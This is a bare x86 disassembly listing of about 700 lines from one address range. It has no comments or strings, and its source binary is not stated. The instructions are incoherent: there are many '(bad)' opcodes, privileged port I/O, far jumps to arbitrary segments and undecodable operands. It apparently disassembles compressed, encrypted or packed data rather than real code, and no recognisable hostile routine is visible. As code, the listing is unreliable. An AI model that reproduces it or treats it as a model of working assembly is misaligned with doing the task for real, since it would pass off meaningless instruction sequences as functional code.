  412748:	fdiv   st(5),st
  41274a:	mov    WORD PTR es:[eax+0x79],?
  41274e:	dec    ebp
  41274f:	jg     0x41276c
  412751:	arpl   sp,di
  412753:	jno    0x41276b
  412755:	and    BYTE PTR [edi+0x0],ch
  412758:	(bad)  
  412759:	cdq    
  41275a:	jbe    0x412708
  41275c:	push   0x18df788b
  412761:	jbe    0x4126ee
  412763:	imul   eax,DWORD PTR ds:0xdf2c15e2,0x46
  41276a:	lds    edx,FWORD PTR [ebx]
  41276c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41276d:	fist   DWORD PTR [ecx+0x6c22aeb1]
  412773:	loope  0x4127ba
  412775:	mov    ds:0xd0cf93c6,eax
  41277a:	mov    bl,0x78
  41277c:	rol    DWORD PTR [ecx],1
  41277e:	out    dx,al
  41277f:	inc    eax
  412780:	test   BYTE PTR [eax],bh
  412782:	xchg   esp,eax
  412783:	int3   
  412784:	lahf   
  412785:	jmp    0x6b2b:0xfdd384b8
  41278c:	pop    eax
  41278d:	(bad)  
  41278e:	mov    ch,0xe8
  412790:	mov    bl,0xd
  412792:	xchg   ecx,eax
  412793:	pushf  
  412794:	loope  0x4127c4
  412796:	jbe    0x412721
  412798:	sar    al,0x6
  41279b:	in     al,0xd4
  41279d:	adc    bl,dh
  41279f:	inc    ebp
  4127a0:	dec    eax
  4127a1:	mov    ch,0x14
  4127a3:	pop    sp
  4127a5:	push   edi
  4127a6:	leave  
  4127a7:	sbb    esi,DWORD PTR [eax-0x24]
  4127aa:	pop    esp
  4127ab:	dec    DWORD PTR [ebp-0x41]
  4127ae:	pushf  
  4127af:	inc    esp
  4127b0:	cli    
  4127b1:	mov    BYTE PTR ds:0xab100d9c,bh
  4127b7:	xlat   BYTE PTR ds:[ebx]
  4127b8:	push   ecx
  4127b9:	cwde   
  4127ba:	outs   dx,DWORD PTR ds:[esi]
  4127bb:	lods   al,BYTE PTR ds:[esi]
  4127bc:	jmp    0x4127ea
  4127be:	(bad)  
  4127bf:	rcl    BYTE PTR ds:0xd2c06975,cl
  4127c5:	inc    BYTE PTR [eax]
  4127c7:	jo     0x4127fb
  4127c9:	push   ss
  4127ca:	or     eax,0x4dde90bd
  4127cf:	std    
  4127d0:	or     al,bl
  4127d2:	mov    ds:0xbd83bfc,al
  4127d7:	push   edx
  4127d8:	sub    eax,0x31205007
  4127dd:	sub    DWORD PTR [esi-0x1d],esp
  4127e0:	dec    esi
  4127e1:	out    dx,eax
  4127e2:	bound  edx,QWORD PTR [edi]
  4127e4:	mov    BYTE PTR [ebp+0x40],ah
  4127e7:	inc    eax
  4127e8:	cli    
  4127e9:	retf   
  4127ea:	gs jecxz 0x412869
  4127ed:	sub    BYTE PTR [ebx-0x39a34857],dl
  4127f3:	in     eax,dx
  4127f4:	mov    edi,0x668fb258
  4127f9:	sar    BYTE PTR [ebp+ecx*4-0x1d7554c0],0xcb
  412801:	ss loope 0x41284f
  412804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412805:	jmp    0xf753:0x75d1e36e
  41280c:	retf   0xdf9a
  41280f:	call   0x16b5ce54
  412814:	adc    al,0x85
  412816:	xor    ebp,DWORD PTR [ebp-0x13efb451]
  41281c:	(bad)  
  41281d:	ds stos BYTE PTR es:[edi],al
  41281f:	sub    DWORD PTR [ebx+0x7289755f],esp
  412825:	pop    ds
  412826:	out    dx,al
  412827:	mov    esp,0xfd30e74c
  41282c:	xchg   esi,eax
  41282d:	mov    al,BYTE PTR [ebx]
  41282f:	cmp    ah,BYTE PTR [ecx]
  412831:	dec    ebx
  412832:	popf   
  412833:	std    
  412834:	das    
  412835:	mov    ah,0x5f
  412837:	pop    ebx
  412838:	popf   
  412839:	clc    
  41283a:	mov    ah,0xf6
  41283c:	leave  
  41283d:	(bad)  
  41283e:	jmp    0x412839
  412840:	pop    edi
  412841:	retf   
  412842:	xor    bl,cl
  412844:	stos   DWORD PTR es:[edi],eax
  412845:	mov    al,0x42
  412847:	dec    ecx
  412848:	mov    cl,0x8c
  41284a:	and    DWORD PTR [edi],esp
  41284c:	mov    ebx,0xa9b2ec0e
  412851:	xchg   edx,eax
  412852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412853:	and    edi,eax
  412855:	sbb    eax,0x3575e97a
  41285a:	xchg   ecx,eax
  41285b:	jge    0x412818
  41285d:	jl     0x4128db
  41285f:	push   0xdd62a4e9
  412864:	and    eax,0xe368fce1
  412869:	shl    ebx,1
  41286b:	jl     0x4128b3
  41286d:	xor    eax,ebp
  41286f:	mov    ebp,0xfbf9ecf4
  412874:	mov    dh,0xaf
  412876:	or     esp,esp
  412878:	jne    0x412816
  41287a:	sti    
  41287b:	call   0xa2c4:0xb0b2d57d
  412882:	fcomp  DWORD PTR [edx+edx*2+0x70]
  412886:	jg     0x412810
  412888:	inc    BYTE PTR [ebp+0x59]
  41288b:	sub    DWORD PTR [ebx-0x34c06f77],edx
  412891:	mov    esi,0xddfb7385
  412896:	mov    ebp,0x5e9ae61d
  41289b:	ds xor eax,0xbd523712
  4128a1:	pusha  
  4128a2:	push   esp
  4128a3:	rcr    DWORD PTR [eax+0x11],cl
  4128a6:	lock ucomiss xmm1,DWORD PTR [edi-0x3]
  4128ab:	sbb    DWORD PTR [edx-0x6247510d],edi
  4128b1:	push   ebp
  4128b2:	ret    0x6d5a
  4128b5:	jmp    DWORD PTR [ecx+0x10]
  4128b8:	push   es
  4128b9:	daa    
  4128ba:	jno    0x412920
  4128bc:	leave  
  4128bd:	mov    DWORD PTR [eax+0x40b4be2e],esi
  4128c3:	pop    ebx
  4128c4:	push   esi
  4128c5:	push   esp
  4128c6:	and    ebp,edi
  4128c8:	fs std 
  4128ca:	xchg   ecx,eax
  4128cb:	pop    ebp
  4128cc:	loop   0x41286e
  4128ce:	adc    ch,al
  4128d0:	scas   al,BYTE PTR es:[edi]
  4128d1:	xor    DWORD PTR ds:0x34a9b211,ebp
  4128d7:	or     DWORD PTR [ecx-0x6c19b46d],0xffffffec
  4128de:	and    eax,0xe959539d
  4128e3:	jge    0x412876
  4128e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128e6:	push   0x83fbfe95
  4128eb:	test   DWORD PTR [ebx],edx
  4128ed:	(bad)  
  4128ee:	push   cs
  4128ef:	gs xor al,0xd0
  4128f2:	pop    ebx
  4128f3:	fidiv  DWORD PTR [ebx+0x35]
  4128f6:	jmp    0x412907
  4128f8:	cmp    DWORD PTR [edi+0x7d],0xffffff90
  4128fc:	pop    edx
  4128fd:	or     cl,BYTE PTR [edi+0x7e457a6f]
  412903:	fmul   DWORD PTR [edi-0x6d]
  412906:	rol    DWORD PTR [ebp+0x248b2845],cl
  41290c:	mov    DWORD PTR [edx-0x1e7d5c8c],edi
  412912:	sar    DWORD PTR [eax-0xad5f1cf],1
  412918:	test   eax,0xdf66d6ac
  41291d:	mov    bl,0x74
  41291f:	jge    0x4128a7
  412921:	es jg  0x41296b
  412924:	jns    0x4128cf
  412926:	mov    al,al
  412928:	nop
  412929:	ret    
  41292a:	pop    eax
  41292b:	cmp    DWORD PTR [esi-0x3e08717b],esi
  412931:	lods   al,BYTE PTR ds:[esi]
  412932:	jg     0x4128c5
  412934:	std    
  412935:	call   0xa84ceb4a
  41293a:	pusha  
  41293b:	and    DWORD PTR [eax-0x68],0xffffffcc
  41293f:	ret    0x35e6
  412942:	push   ecx
  412943:	leave  
  412944:	xchg   ebx,eax
  412945:	aad    0xf3
  412947:	(bad)  
  412948:	sbb    ebx,ebp
  41294a:	lds    esi,FWORD PTR [edx]
  41294c:	xchg   esp,eax
  41294d:	cmp    ecx,DWORD PTR [edi+edi*4]
  412950:	sahf   
  412951:	sbb    DWORD PTR [ecx-0x39687b27],0x95452c30
  41295b:	dec    edx
  41295c:	fst    DWORD PTR [eax+edx*8]
  41295f:	into   
  412960:	adc    eax,0x78a17176
  412965:	mov    edx,DWORD PTR [esi]
  412967:	into   
  412968:	fwait
  412969:	jg     0x41296d
  41296b:	jb     0x41292a
  41296d:	xor    DWORD PTR [ecx],edx
  41296f:	dec    ecx
  412970:	not    DWORD PTR [esi]
  412972:	popf   
  412973:	test   al,0x70
  412975:	popa   
  412976:	cmp    BYTE PTR [edx+ebx*4],dh
  412979:	loopne 0x412988
  41297b:	lahf   
  41297c:	jae    0x4129bc
  41297e:	ja     0x412925
  412980:	stos   BYTE PTR es:[edi],al
  412981:	xchg   esi,eax
  412982:	leave  
  412983:	imul   edx,DWORD PTR [ebp-0x1a],0x3b
  412987:	fisub  DWORD PTR [edx+0x64]
  41298a:	and    esi,DWORD PTR [ecx-0x306af353]
  412990:	jmp    0x9b5ccada
  412995:	knotb  k1,k7
  412999:	fwait
  41299a:	out    0x32,al
  41299c:	fidiv  WORD PTR [esi+0x6c47c785]
  4129a2:	sbb    BYTE PTR [eax],bl
  4129a4:	mov    edx,0x15a9c51
  4129a9:	mov    eax,0x7ca45a5d
  4129ae:	pop    ss
  4129af:	cwde   
  4129b0:	mov    cl,0x70
  4129b2:	jb     0x412946
  4129b4:	xchg   ebx,eax
  4129b5:	cmp    eax,0x2bc6a296
  4129ba:	dec    eax
  4129bb:	and    edx,edi
  4129bd:	cmp    DWORD PTR [eax+0x20],0x54c0841d
  4129c4:	in     al,dx
  4129c5:	sub    al,0xd4
  4129c7:	hlt    
  4129c8:	mov    ebp,0x6bde011f
  4129cd:	ins    DWORD PTR es:[edi],dx
  4129ce:	mov    ds:0x4f0e28d,al
  4129d3:	dec    edi
  4129d4:	pop    edi
  4129d5:	push   ecx
  4129d6:	jns    0x41299f
  4129d8:	xchg   esi,eax
  4129d9:	dec    ebx
  4129da:	test   al,0xf1
  4129dc:	aas    
  4129dd:	cli    
  4129de:	sbb    ecx,DWORD PTR [eax-0x7d]
  4129e1:	xor    bl,BYTE PTR [ebx+0x7b]
  4129e4:	stc    
  4129e5:	inc    ecx
  4129e6:	mov    esi,0x5e2200f1
  4129eb:	adc    DWORD PTR [ebp-0x75424a1d],edx
  4129f1:	jnp    0x4129bc
  4129f3:	inc    esi
  4129f4:	dec    edx
  4129f5:	and    DWORD PTR [ebp-0x30],ebp
  4129f8:	rcr    BYTE PTR [eax+0x3b],cl
  4129fb:	pop    ebp
  4129fc:	jmp    0x412a79
  4129fe:	push   esi
  4129ff:	mov    edx,0xf620c4d1
  412a04:	and    eax,0xc1b4f0e5
  412a09:	inc    ebx
  412a0a:	std    
  412a0b:	cld    
  412a0c:	jae    0x412a2b
  412a0e:	pop    ecx
  412a0f:	loop   0x412a6c
  412a11:	sbb    al,0x62
  412a13:	mov    ecx,0x5ff807cf
  412a18:	icebp  
  412a19:	into   
  412a1a:	scas   al,BYTE PTR es:[edi]
  412a1b:	mov    ds:0x258cc7b,eax
  412a20:	imul   ebx,DWORD PTR [ebx+eiz*1-0x75e7604b],0xffffffa3
  412a28:	dec    ecx
  412a29:	out    0xae,al
  412a2b:	cmp    DWORD PTR [esi-0x7e8fe117],ebx
  412a31:	imul   BYTE PTR [esi+0x13]
  412a34:	add    bl,0x64
  412a37:	dec    esp
  412a38:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  412a3a:	int    0xbc
  412a3c:	or     eax,0x39d3b403
  412a41:	inc    ebx
  412a42:	popa   
  412a43:	data16 fisubr DWORD PTR [ecx+ecx*8+0x63f93e45]
  412a4b:	loopne 0x412a06
  412a4d:	addr16 or ecx,esi
  412a50:	retf   0xfced
  412a53:	xor    DWORD PTR [edi-0x9a15261],edi
  412a59:	(bad)  
  412a5a:	and    ebp,DWORD PTR [edx]
  412a5c:	mov    esi,0x1bab4e44
  412a61:	add    ebx,DWORD PTR [esi+ebx*2]
  412a64:	into   
  412a65:	and    al,0x2f
  412a67:	cs pop ss
  412a69:	sbb    eax,0x4bfc440e
  412a6e:	pop    esp
  412a6f:	into   
  412a70:	add    BYTE PTR [ebx+ecx*4],ch
  412a73:	icebp  
  412a74:	fs pop ds
  412a76:	dec    ebx
  412a77:	repnz imul esi,DWORD PTR [edi],0x19895622
  412a7e:	ds pop es
  412a80:	sub    ch,BYTE PTR [ebx-0x31c88859]
  412a86:	lock adc edi,DWORD PTR [eax+0x50]
  412a8a:	sar    BYTE PTR [ebp-0x712a1f7f],cl
  412a90:	mov    ds:0x479b8d93,al
  412a95:	jbe    0x412ae0
  412a97:	fisttp QWORD PTR [esi+0x76]
  412a9a:	push   0x39e55f50
  412a9f:	aaa    
  412aa0:	inc    edx
  412aa1:	push   esp
  412aa2:	pop    es
  412aa3:	retf   
  412aa4:	dec    edi
  412aa5:	jle    0x412aff
  412aa7:	test   al,0x99
  412aa9:	add    dh,bh
  412aab:	mov    DWORD PTR [ebp+ebx*1+0x15],edx
  412aaf:	add    esi,DWORD PTR [ebx+ebp*1]
  412ab2:	bound  edx,QWORD PTR [esi+0x7a]
  412ab5:	test   al,0xdf
  412ab7:	inc    esi
  412ab8:	jg     0x412ad0
  412aba:	cdq    
  412abb:	jmp    DWORD PTR [eax-0x6c50b0d2]
  412ac1:	out    dx,eax
  412ac2:	loope  0x412ae5
  412ac4:	xchg   ebx,eax
  412ac5:	push   DWORD PTR [esi]
  412ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ac8:	jmp    0x412a70
  412aca:	push   ds
  412acb:	(bad)
  412ace:	pop    eax
  412acf:	in     al,dx
  412ad0:	inc    edi
  412ad1:	xchg   DWORD PTR [esi+0x79da60a2],esi
  412ad7:	aad    0x3
  412ad9:	out    dx,al
  412ada:	mov    ch,BYTE PTR [ebx-0x17]
  412add:	dec    edi
  412ade:	hlt    
  412adf:	xchg   esi,eax
  412ae0:	mov    cl,0x2
  412ae2:	pop    es
  412ae3:	ja     0x412ab4
  412ae5:	jnp    0x412ab1
  412ae7:	push   0x41f3a91e
  412aec:	mov    ds:0x292b5986,eax
  412af1:	sbb    ecx,esp
  412af3:	pushf  
  412af4:	out    0x25,al
  412af6:	out    dx,al
  412af7:	std    
  412af8:	push   ds
  412af9:	inc    esi
  412afa:	adc    esp,DWORD PTR [esi-0x32c2244a]
  412b00:	sbb    esp,DWORD PTR [edx-0x3bec4e2d]
  412b06:	lds    eax,FWORD PTR [eax-0x24c7400e]
  412b0c:	shl    bl,1
  412b0e:	jo     0x412b23
  412b10:	pop    edi
  412b11:	ret    0x7728
  412b14:	les    esi,FWORD PTR [edx-0x5]
  412b17:	xchg   ebp,eax
  412b18:	ss dec esp
  412b1a:	dec    esi
  412b1b:	push   ss
  412b1c:	cwde   
  412b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b1e:	pop    eax
  412b1f:	mov    ds:0x29e628c2,al
  412b24:	jp     0x412b35
  412b26:	sub    edi,DWORD PTR [edx]
  412b28:	cwde   
  412b29:	jo     0x412b20
  412b2b:	xchg   ebx,eax
  412b2c:	push   es
  412b2d:	aaa    
  412b2e:	mov    ds:0xe23284e,al
  412b33:	sbb    BYTE PTR [ecx-0x51ffb381],dl
  412b39:	imul   edi,DWORD PTR [esi-0x1f1c532a],0xffffffcc
  412b40:	mov    cl,0x89
  412b42:	(bad)  
  412b43:	fstp   DWORD PTR [eax+eiz*4]
  412b46:	or     cl,bh
  412b48:	push   es
  412b49:	sub    ebp,DWORD PTR [ecx+0x297c0acf]
  412b4f:	ficomp DWORD PTR [ebx+0x34]
  412b52:	inc    esi
  412b53:	outs   dx,DWORD PTR ds:[esi]
  412b54:	push   esp
  412b55:	scas   eax,DWORD PTR es:[edi]
  412b56:	sbb    BYTE PTR [ecx-0x4c98642c],ch
  412b5c:	push   ebp
  412b5d:	scas   al,BYTE PTR es:[edi]
  412b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b5f:	in     eax,0x52
  412b61:	add    esp,DWORD PTR [eax+0x56]
  412b64:	outs   dx,BYTE PTR ds:[esi]
  412b65:	ss aas 
  412b67:	fbstp  TBYTE PTR [edx-0x5fc7e4d2]
  412b6d:	loope  0x412b10
  412b6f:	sub    DWORD PTR ds:0x7f7f3318,edi
  412b75:	xchg   edi,eax
  412b76:	sbb    eax,0x4a15285e
  412b7b:	jns    0x412b69
  412b7d:	xor    al,0x99
  412b7f:	push   ss
  412b80:	mov    ds:0xc534b976,eax
  412b85:	aad    0xbb
  412b87:	and    al,0x56
  412b89:	ss (bad) 
  412b8b:	(bad)  
  412b8d:	pop    ss
  412b8e:	pop    edx
  412b8f:	mov    dl,0x1d
  412b91:	push   cs
  412b92:	mov    esp,0x3d7f2a42
  412b97:	pop    edi
  412b98:	push   edx
  412b99:	push   ebp
  412b9a:	push   ecx
  412b9b:	add    eax,DWORD PTR [edi]
  412b9d:	js     0x412b2b
  412b9f:	ins    BYTE PTR es:[edi],dx
  412ba0:	mov    dh,0x44
  412ba2:	adc    bl,BYTE PTR [edi-0x25c75684]
  412ba8:	repnz pop ds
  412baa:	je     0x412b32
  412bac:	js     0x412bab
  412bae:	icebp  
  412baf:	push   0x7a
  412bb1:	mov    al,0xe
  412bb3:	pushf  
  412bb4:	mov    dh,0x6a
  412bb6:	sbb    BYTE PTR [esi-0x69],dh
  412bb9:	sub    BYTE PTR [edi-0x18],bl
  412bbc:	adc    BYTE PTR [ebp+eax*1+0x43],bl
  412bc0:	mov    edi,0x4b379180
  412bc5:	int3   
  412bc6:	loope  0x412bb7
  412bc8:	cmp    dh,BYTE PTR [ebx-0x6802ae8a]
  412bce:	js     0x412c21
  412bd0:	mov    dh,0xef
  412bd2:	retf   
  412bd3:	mov    al,0x67
  412bd5:	pop    ss
  412bd6:	jle    0x412c16
  412bd8:	dec    esi
  412bd9:	adc    DWORD PTR [eax-0x7e],ebp
  412bdc:	and    DWORD PTR [ecx+0x12],ebp
  412bdf:	push   eax
  412be0:	sti    
  412be1:	push   ss
  412be2:	xchg   ebp,eax
  412be3:	(bad)  
  412be4:	shl    DWORD PTR [esi],1
  412be6:	call   FWORD PTR [ecx]
  412be8:	loop   0x412c20
  412bea:	rcr    BYTE PTR [edi-0x64],cl
  412bed:	cld    
  412bee:	push   es
  412bef:	mov    bl,0xfb
  412bf1:	sti    
  412bf2:	fidivr WORD PTR [eax]
  412bf4:	pusha  
  412bf5:	outs   dx,DWORD PTR ds:[esi]
  412bf6:	bound  ecx,QWORD PTR [ebp-0x5f6abe72]
  412bfc:	push   0x45cbe161
  412c01:	push   edx
  412c02:	mov    bh,0x75
  412c04:	add    DWORD PTR [ecx],edx
  412c06:	mov    ebx,0x62cdc706
  412c0b:	mov    eax,ds:0x2101fafb
  412c10:	leave  
  412c11:	nop
  412c12:	mov    dh,0x26
  412c14:	fst    QWORD PTR [ecx]
  412c16:	jecxz  0x412bdc
  412c18:	test   eax,0x4837a325
  412c1d:	pop    ss
  412c1e:	sahf   
  412c1f:	lods   al,BYTE PTR ds:[esi]
  412c20:	jne    0x412bb1
  412c22:	out    0xa0,eax
  412c24:	pop    ebp
  412c25:	dec    ebx
  412c26:	mov    esp,0xd64df317
  412c2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c2c:	imul   edx,edx,0x62
  412c2f:	pop    esp
  412c30:	adc    BYTE PTR [edx+0x3f],0xa0
  412c34:	jo     0x412bba
  412c36:	mov    ebp,0x1df20719
  412c3b:	es jno 0x412c86
  412c3e:	test   DWORD PTR [ebp+0x3e],ebp
  412c41:	cs xchg esi,eax
  412c43:	pop    edi
  412c44:	jmp    0x412be6
  412c46:	ja     0x412c56
  412c48:	mov    fs,WORD PTR [esi+edi*4]
  412c4b:	fadd   st(0),st
  412c4d:	out    dx,ax
  412c4f:	sub    eax,0x5575805f
  412c54:	cmp    cl,BYTE PTR [esi-0x2d]
  412c57:	ins    BYTE PTR es:[edi],dx
  412c58:	cmp    al,BYTE PTR [eax-0x1481ca67]
  412c5e:	adc    al,0x60
  412c60:	jmp    0xa0f8dd3
  412c65:	adc    eax,0xdc0d5f2b
  412c6a:	scas   al,BYTE PTR es:[edi]
  412c6b:	out    0xf7,al
  412c6d:	ret    0x1f8a
  412c70:	dec    esp
  412c71:	inc    edx
  412c72:	rcl    BYTE PTR [eax+0x13],1
  412c75:	pop    ecx
  412c76:	retf   
  412c77:	sub    eax,0x5d83abee
  412c7c:	ins    DWORD PTR es:[edi],dx
  412c7d:	jo     0x412c74
  412c7f:	xchg   ebp,eax
  412c80:	je     0x412cb9
  412c82:	xchg   BYTE PTR [edi-0x18f55a89],cl
  412c88:	imul   esi,DWORD PTR [ecx+0x2ecd774],0x64c73b6d
  412c92:	and    edi,DWORD PTR [esi+0x7d]
  412c95:	icebp  
  412c96:	inc    edi
  412c98:	pop    esp
  412c99:	mov    ebp,0xa63f73fa
  412c9e:	mov    dh,0xaa
  412ca0:	pop    ebp
  412ca1:	fnstenv [ebp+0x24]
  412ca4:	dec    ebp
  412ca5:	into   
  412ca6:	add    BYTE PTR [ebp-0x1da7971c],ah
  412cac:	mov    eax,ds:0xdd6f1cd
  412cb1:	inc    ebp
  412cb2:	mov    ebx,0x114c490e
  412cb7:	pushf  
  412cb8:	popa   
  412cb9:	leave  
  412cba:	cmp    eax,0xdeda6426
  412cbf:	daa    
  412cc0:	xlat   BYTE PTR ds:[ebx]
  412cc1:	xor    BYTE PTR [ebx],ah
  412cc3:	sbb    edx,DWORD PTR [ecx+0x68]
  412cc6:	int    0x38
  412cc8:	ins    DWORD PTR es:[edi],dx
  412cc9:	jns    0x412cdc
  412ccb:	sti    
  412ccc:	adc    edi,DWORD PTR [ebp-0x1d]
  412ccf:	push   es
  412cd0:	sbb    eax,0xc44c7b3d
  412cd5:	iret   
  412cd6:	mov    ah,0x42
  412cd8:	(bad)  
  412cd9:	aam    0xc3
  412cdb:	push   ebp
  412cdc:	shl    BYTE PTR [ecx-0x20009ef7],1
  412ce2:	inc    edx
  412ce3:	les    ecx,FWORD PTR [ebx+esi*4]
  412ce6:	cmp    BYTE PTR [ebp+0x63],bh
  412ce9:	rol    BYTE PTR [esi-0x4664095f],0x2b
  412cf0:	pop    ds
  412cf1:	xor    DWORD PTR [ecx+ecx*8+0x1f91032b],0x3119bca1
  412cfc:	shr    DWORD PTR [eax],0xc
  412cff:	hlt    
  412d00:	(bad)  
  412d01:	gs pop eax
  412d03:	je     0x412d62
  412d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d06:	push   0xffffff88
  412d08:	and    DWORD PTR [ecx+edx*4-0x5f831166],esp
  412d0f:	into   
  412d10:	xchg   edi,eax
  412d11:	out    0xf1,eax
  412d13:	or     dl,bh
  412d15:	pop    ebp
  412d16:	and    BYTE PTR [ebp+0x4e],bl
  412d19:	dec    ebx
  412d1a:	test   eax,0xfac325ce
  412d1f:	(bad)  
  412d20:	jge    0x412d44
  412d22:	pop    ds
  412d23:	xor    eax,0x33082319
  412d28:	in     eax,dx
  412d29:	inc    ebx
  412d2a:	push   edi
  412d2b:	inc    ecx
  412d2c:	rol    ebp,1
  412d2e:	pop    ebp
  412d2f:	add    al,0xcf
  412d31:	das    
  412d32:	cmp    ebx,DWORD PTR [eax]
  412d34:	imul   ecx,ecx,0x5f
  412d37:	cmp    eax,0x55cfb2a3
  412d3c:	xor    DWORD PTR [edx-0x3581c44d],0xffffffde
  412d43:	mov    dl,0x69
  412d45:	call   0xc4f4:0x58cf1990
  412d4c:	out    0x7a,eax
  412d4e:	ins    DWORD PTR es:[edi],dx
  412d4f:	pop    es
  412d50:	in     al,0xfc
  412d52:	int3   
  412d53:	add    DWORD PTR ds:0xceea647b,esi
  412d59:	mov    cl,0x83
  412d5b:	add    ah,cl
  412d5d:	push   0x5df94fd5
  412d62:	mov    eax,0x6e6f4fc1
  412d67:	xchg   BYTE PTR [ebx],dh
  412d69:	mov    esp,esp
  412d6b:	or     ebp,ecx
  412d6d:	cmp    BYTE PTR [esi+ecx*1],ch
  412d70:	dec    eax
  412d71:	sbb    al,0x18
  412d73:	mov    al,ds:0x11ab4d04
  412d78:	repz fistp WORD PTR [ebp+eax*1+0x3210742b]
  412d80:	lods   al,BYTE PTR ds:[esi]
  412d81:	jg     0x412d71
  412d83:	test   DWORD PTR [edx-0x4fc3ffa8],0xf1c7ea81
  412d8d:	pop    edx
  412d8e:	mov    dh,0x8d
  412d90:	jmp    FWORD PTR [esi]
  412d92:	sub    al,0x7f
  412d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d95:	push   0xffffffc0
  412d97:	int3   
  412d98:	pop    es
  412d99:	or     al,0xbc
  412d9b:	dec    eax
  412d9c:	shl    edi,0x46
  412d9f:	mov    ecx,0x8b2e87de
  412da4:	js     0x412d7f
  412da6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412da7:	sbb    BYTE PTR [eax-0x40],cl
  412daa:	xlat   BYTE PTR ds:[ebx]
  412dab:	sbb    eax,esi
  412dad:	shr    BYTE PTR [esi-0x20633087],0x71
  412db4:	sbb    al,0x8d
  412db6:	xchg   ebp,eax
  412db7:	arpl   WORD PTR [edi-0x5e],dx
  412dba:	push   edx
  412dbb:	cwde   
  412dbc:	adc    bh,BYTE PTR [eax+0x55dba932]
  412dc2:	js     0x412d69
  412dc4:	and    al,0x5b
  412dc6:	lods   al,BYTE PTR ds:[esi]
  412dc7:	lahf   
  412dc8:	mov    ecx,0x3c4e628
  412dcd:	clc    
  412dce:	iret   
  412dcf:	fdivr  st,st(3)
  412dd1:	cld    
  412dd2:	test   BYTE PTR ds:0x432c0f75,bh
  412dd8:	out    0xe4,al
  412dda:	cmc    
  412ddb:	lock rcl BYTE PTR [edx-0x3e777028],0x9e
  412de3:	add    ah,BYTE PTR [edi-0x6]
  412de6:	lds    ecx,FWORD PTR [ebp-0x70]
  412de9:	mov    DWORD PTR [ebx-0x52bf51c],ebp
  412def:	ins    DWORD PTR es:[edi],dx
  412df0:	test   edi,ebp
  412df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412df3:	dec    esi
  412df4:	fdiv   QWORD PTR [eax]
  412df6:	inc    edx
  412df7:	xor    dh,BYTE PTR [ebx-0x4]
  412dfa:	out    0xa5,al
  412dfc:	and    BYTE PTR [ebp+0x73dad99a],ah
  412e02:	inc    edi
  412e03:	pop    ecx
  412e04:	cli    
  412e05:	push   ds
  412e06:	fwait
  412e07:	bound  esp,QWORD PTR [ecx]
  412e09:	push   cs
  412e0a:	sub    al,0xc5
  412e0c:	(bad)  
  412e0e:	xor    ebx,DWORD PTR [ebx+edi*4]
  412e11:	push   cs
  412e12:	inc    esi
  412e13:	sbb    esi,edx
  412e15:	sbb    eax,ecx
  412e17:	loopne 0x412e8a
  412e19:	xor    ebx,0x46
  412e1c:	mov    BYTE PTR [edi+0x7943b4ac],dl
  412e22:	inc    BYTE PTR [edx+edx*4]
  412e25:	pop    esi
  412e26:	and    DWORD PTR [edx-0x57],esi
  412e29:	sti    
  412e2a:	adc    DWORD PTR [esi-0x6],ebp
  412e2d:	push   cs
  412e2e:	xor    eax,0x126e37d4
  412e33:	fwait
  412e34:	rcl    ah,0xaa
  412e37:	loopne 0x412ea9
  412e39:	sub    eax,0x16145608
  412e3e:	sar    BYTE PTR [ebp-0xf],1
  412e41:	mov    esi,0xd8121e87
  412e46:	adc    esp,edx
  412e48:	jo     0x412e00
  412e4a:	in     eax,0xd3
  412e4c:	cmp    dh,BYTE PTR gs:[esi]
  412e4f:	jp     0x412e01
  412e51:	pop    ss
  412e52:	and    ebp,edi
  412e54:	dec    edx
  412e55:	inc    ebp
  412e56:	inc    esi
  412e57:	push   es
  412e58:	leave  
  412e59:	les    esi,FWORD PTR [ecx+0x2e]
  412e5c:	xchg   ebx,eax
  412e5d:	rcl    BYTE PTR [ebx+ebp*8-0x1c],1
  412e61:	test   eax,0xb9f50d33
  412e66:	dec    ebx
  412e67:	mov    ?,WORD PTR [edi+0x2b27eb52]
  412e6d:	pop    esp
  412e6e:	fst    QWORD PTR [ecx-0x777ecc47]
  412e74:	in     eax,dx
  412e75:	outs   dx,BYTE PTR ds:[esi]
  412e76:	jns    0x412e0d
  412e78:	inc    ebx
  412e79:	sub    eax,0xb5eac276
  412e7e:	cmp    al,0xa2
  412e80:	imul   esi,DWORD PTR [ebp+0x14],0x37
  412e84:	jne    0x412e52
  412e86:	imul   ecx,DWORD PTR cs:[edi-0x4d5218dd],0x1d
  412e8e:	and    eax,DWORD PTR [ecx-0x32949f22]
  412e94:	rcl    dh,1
  412e96:	xchg   edi,eax
  412e97:	add    BYTE PTR [edx],al
  412e99:	cli    
  412e9a:	adc    DWORD PTR [ebp-0x4fadd11e],ebp
  412ea0:	int    0x43
  412ea2:	jle    0x412e4a
  412ea4:	cmp    BYTE PTR [ebx+0x15790686],cl
  412eaa:	jge    0x412f04
  412eac:	nop
  412ead:	push   ds
  412eae:	add    DWORD PTR [edx],edx
  412eb0:	mov    al,ds:0x979edc03
  412eb5:	mov    edi,0x5bb23265
  412eba:	sub    ebp,DWORD PTR [edx-0x50]
  412ebd:	imul   eax,DWORD PTR [ebx+0x2c],0x41
  412ec1:	aad    0x9a
  412ec3:	mov    dl,0x3f
  412ec5:	(bad)  
  412ec6:	xor    eax,0x31970dce
  412ecb:	add    edi,DWORD PTR ds:0xfaf03c23
  412ed1:	jno    0x412f08
  412ed3:	jmp    0x38113c81
  412ed8:	arpl   WORD PTR [ebx+0x5f],ax
  412edb:	pusha  
  412edc:	ins    BYTE PTR es:[edi],dx
  412edd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ede:	mov    bl,0x3
  412ee0:	mov    dl,0xd3
  412ee2:	nop
  412ee3:	mov    cl,0xf1
  412ee5:	sbb    cl,BYTE PTR [esi+0x4322490f]
  412eeb:	mov    dl,0x21
  412eed:	call   0xaffe8215
